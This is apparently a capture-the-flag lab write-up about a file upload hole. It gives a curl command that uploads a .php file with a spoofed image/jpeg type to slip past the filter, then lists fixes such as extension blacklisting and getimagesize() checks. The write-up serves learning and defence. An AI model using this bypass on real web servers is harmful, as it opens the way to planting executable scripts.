# Vulnerability

Go to add image at the bottom of the main page
`http://192.168.56.101/?page=upload`

With curl:
`touch test.php && curl -s -X POST -F "uploaded=@./test.php;type=image/jpeg" -F "Upload=Upload" "http://<IP>/index.php?page=upload" | grep flag`

# Protection

- blacklisting file extensions
- use function like getimagesize() in php to check if the image content is valid

# Source

https://www.geeksforgeeks.org/php-getimagesize-function/
